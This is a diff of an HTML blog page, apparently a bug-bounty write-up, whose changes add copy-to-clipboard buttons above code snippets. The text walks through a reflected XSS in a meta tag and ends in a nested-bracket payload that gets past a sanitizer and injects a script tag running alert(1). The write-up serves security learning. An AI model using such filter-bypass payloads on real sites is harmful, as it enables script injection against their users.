 &lt;div class=&quot;language-html highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;https://www.example.com/?vuln-param=bugbountytest1
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
 &lt;p&gt;where vuln-param is the vulnerable param to XSS.&lt;/p&gt;
 
 &lt;p&gt;The parameter was reflected in several places but the problematic characters was reflected only in one of them: in the content attribute of a meta tag. So the response of the above request contained the following HTML code&lt;/p&gt;
+
+&lt;div class=&quot;code-header&quot;&gt;
+  &lt;button class=&quot;copy-code-button&quot;&gt;
+    Copy code to clipboard
+  &lt;/button&gt;
+&lt;/div&gt;
 
 &lt;div class=&quot;language-html highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;meta&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;name=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;title&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;content=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Resultados asociados a la palabra: &apos;bugbountytest1&apos;&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;/&amp;gt;&lt;/span&gt;
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
@@ -884,10 +1109,22 @@ prompt
 
 &lt;p&gt;so I tried to break the attribute assignment through a request of the form&lt;/p&gt;
 
+&lt;div class=&quot;code-header&quot;&gt;
+  &lt;button class=&quot;copy-code-button&quot;&gt;
+    Copy code to clipboard
+  &lt;/button&gt;
+&lt;/div&gt;
+
 &lt;div class=&quot;language-html highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;https://www.example.com/?vuln-param=bugbountytest1&apos;&quot;&amp;gt;bugbountytest2
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
 &lt;p&gt;and the response contained the following HTML code&lt;/p&gt;
+
+&lt;div class=&quot;code-header&quot;&gt;
+  &lt;button class=&quot;copy-code-button&quot;&gt;
+    Copy code to clipboard
+  &lt;/button&gt;
+&lt;/div&gt;
 
 &lt;div class=&quot;language-html highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;meta&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;name=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;title&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;content=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Resultados asociados a la palabra: &apos;bugbountytest1&apos;&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
 bugbountytest2
@@ -895,10 +1132,22 @@ bugbountytest2
 
 &lt;p&gt;So far so good. Then I tried to inject some javascript code through a request of the form&lt;/p&gt;
 
+&lt;div class=&quot;code-header&quot;&gt;
+  &lt;button class=&quot;copy-code-button&quot;&gt;
+    Copy code to clipboard
+  &lt;/button&gt;
+&lt;/div&gt;
+
 &lt;div class=&quot;language-html highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;https://www.example.com/?vuln-param=bugbountytest1&apos;&quot;&amp;gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;script&amp;gt;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;alert&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;/script&amp;gt;&lt;/span&gt;
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
 &lt;p&gt;and the response contained the following HTML code&lt;/p&gt;
+
+&lt;div class=&quot;code-header&quot;&gt;
+  &lt;button class=&quot;copy-code-button&quot;&gt;
+    Copy code to clipboard
+  &lt;/button&gt;
+&lt;/div&gt;
 
 &lt;div class=&quot;language-html highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;meta&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;name=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;title&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;content=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Resultados asociados a la palabra: &apos;bugbountytest1&apos;&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
 alert(1)
@@ -910,20 +1159,44 @@ alert(1)
 
 &lt;p&gt;To answer the above question I sent a request of the form&lt;/p&gt;
 
+&lt;div class=&quot;code-header&quot;&gt;
+  &lt;button class=&quot;copy-code-button&quot;&gt;
+    Copy code to clipboard
+  &lt;/button&gt;
+&lt;/div&gt;
+
 &lt;div class=&quot;language-html highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;https://www.example.com/?vuln-param=bugbountytest1&apos;&quot;&amp;gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;bugbountytest2&amp;gt;&lt;/span&gt;
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
 &lt;p&gt;and the response contained the following HTML code&lt;/p&gt;
+
+&lt;div class=&quot;code-header&quot;&gt;
+  &lt;button class=&quot;copy-code-button&quot;&gt;
+    Copy code to clipboard
+  &lt;/button&gt;
+&lt;/div&gt;
 
 &lt;div class=&quot;language-html highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;meta&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;name=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;title&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;content=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Resultados asociados a la palabra: &apos;bugbountytest1&apos;&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
 &lt;p&gt;so the sanitization removes all the content between the &amp;lt; and &amp;gt; characters, both characters included, and not only the content that matches with some keywords. After that I wondered if nesting the &amp;lt; and &amp;gt; characters would give a different result so I sent several requests nesting the &amp;lt; and &amp;gt; characters but the most revealing of all was&lt;/p&gt;
 
+&lt;div class=&quot;code-header&quot;&gt;
+  &lt;button class=&quot;copy-code-button&quot;&gt;
+    Copy code to clipboard
+  &lt;/button&gt;
+&lt;/div&gt;
+
 &lt;div class=&quot;language-html highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;https://www.example.com/?vuln-param=bugbountytest1&apos;&quot;&amp;gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;bugbountytest2&amp;gt;
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
 &lt;p&gt;whose response contained the following HTML code&lt;/p&gt;
+
+&lt;div class=&quot;code-header&quot;&gt;
+  &lt;button class=&quot;copy-code-button&quot;&gt;
+    Copy code to clipboard
+  &lt;/button&gt;
+&lt;/div&gt;
 
 &lt;div class=&quot;language-html highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;meta&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;name=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;title&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;content=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Resultados asociados a la palabra: &apos;bugbountytest1&apos;&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
 &lt;span class=&quot;nt&quot;&gt;&amp;lt;bugbountytest2&amp;gt;&lt;/span&gt;
@@ -931,10 +1204,22 @@ alert(1)
 
 &lt;p&gt;This result yields a very clear way of injecting javascript code in the response using the following request&lt;/p&gt;
 
+&lt;div class=&quot;code-header&quot;&gt;
+  &lt;button class=&quot;copy-code-button&quot;&gt;
+    Copy code to clipboard
+  &lt;/button&gt;
+&lt;/div&gt;
+
 &lt;div class=&quot;language-html highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;https://www.example.com/?vuln-param=bugbountytest1&apos;&quot;&amp;gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;script&amp;gt;alert(1)&lt;span class=&quot;nt&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;/script&amp;gt;
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
 &lt;p&gt;The response contained the following HTML code&lt;/p&gt;
+
+&lt;div class=&quot;code-header&quot;&gt;
+  &lt;button class=&quot;copy-code-button&quot;&gt;
+    Copy code to clipboard
+  &lt;/button&gt;
+&lt;/div&gt;
 
 &lt;div class=&quot;language-html highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;meta&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;name=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;title&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;content=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Resultados asociados a la palabra: &apos;bugbountytest1&apos;&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
 &lt;span class=&quot;nt&quot;&gt;&amp;lt;script&amp;gt;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;alert&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;/script&amp;gt;&lt;/span&gt;
@@ -969,6 +1254,12 @@ alert(1)
 &lt;h3 id=&quot;323-code-of-the-algorithms&quot;&gt;3.2.3. Code of the algorithms&lt;/h3&gt;
 
 &lt;p&gt;The backend was designed in PHP but I have implemented both algorithms in python to show in practice what I mean by both algorithms&lt;/p&gt;
+
+&lt;div class=&quot;code-header&quot;&gt;
+  &lt;button class=&quot;copy-code-button&quot;&gt;
+    Copy code to clipboard
+  &lt;/button&gt;
+&lt;/div&gt;
 
 &lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;# Return the result of removing from input the substring between the characters in positions i and j
 &lt;/span&gt;&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;remove_substring&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;input&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;j&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
@@ -1245,6 +1536,12 @@ alert(1)
 &lt;h2 id=&quot;6-how-is-the-exam&quot;&gt;6. How is the exam?&lt;/h2&gt;
 
 &lt;p&gt;To begin the exam you have to log in Caendra and click on &lt;strong&gt;“Begin certification process”&lt;/strong&gt;. After that you will receive a pcap file, a list of user names, a list of passwords and a ovpn file to connect to the exam enviroment. If the name of the ovpn file is ovpn_file.ovpn, I advise to you to use the following command to connect to the enviroment&lt;/p&gt;
+
+&lt;div class=&quot;code-header&quot;&gt;
+  &lt;button class=&quot;copy-code-button&quot;&gt;
+    Copy code to clipboard
+  &lt;/button&gt;
+&lt;/div&gt;
 
 &lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;sudo openvpn --config ovpn_file.ovpn --daemon
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
